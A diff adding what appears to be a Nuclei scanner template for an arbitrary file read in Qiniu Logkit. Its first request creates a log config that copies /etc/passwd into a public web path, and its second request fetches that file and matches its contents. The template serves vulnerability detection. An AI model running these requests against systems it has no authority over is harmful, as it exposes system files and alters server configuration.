@@ -1,0 +1,81 @@
+id: poc-qiniu-logkit-anyfile-read
+
+info:
+  name: Qiniu Logkit log_path Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,qiniu
+  description: |
+    This template identifies an arbitrary file read vulnerability in Qiniu Logkit's log_path configuration.
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: step1
+    raw:
+      - |
+        POST /logkit/configs/passwdread HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+        "name": "passwdread",
+        "batch_interval": 1,
+        "collect_interval": 1,
+        "reader": {
+        "mode": "file",
+        "log_path": "/etc/passwd",
+        "read_from": "oldest",
+        "datasource_tag": "datasource",
+        "encoding": "UTF-8"
+        },
+        "parser": {
+        "type": "raw",
+        "name": "parser",
+        "timestamp": "true"
+        },
+        "transforms": [],
+        "senders": [
+        {
+        "sender_type": "file",
+        "file_send_path": "/app/public/passwd.log"
+        }
+        ]
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"code":"L200"}'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+  - id: step2
+    raw:
+      - |
+        GET /passwd.log HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
